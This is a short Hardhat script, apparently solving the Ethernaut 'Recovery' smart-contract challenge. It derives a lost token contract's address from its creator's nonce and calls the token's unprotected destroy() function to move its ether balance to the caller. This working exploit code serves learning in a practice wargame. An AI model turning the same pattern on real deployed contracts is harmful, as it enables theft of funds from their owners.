const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const [owner] = await ethers.getSigners()

  const rec = await ethers.getContractAt("Recovery", process.env.REC)

  const tokenAddr = ethers.utils.getContractAddress({
    from: rec.address,
    nonce: 1,
  })

  console.log("Token address", tokenAddr);

  const token = await ethers.getContractAt("SimpleToken", tokenAddr);

  console.log(`Token balance: ${await ethers.provider.getBalance(token.address)}`)

  const tx = await token.destroy(owner.address);
  await tx.wait()

  console.log(`Token balance: ${await ethers.provider.getBalance(token.address)}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
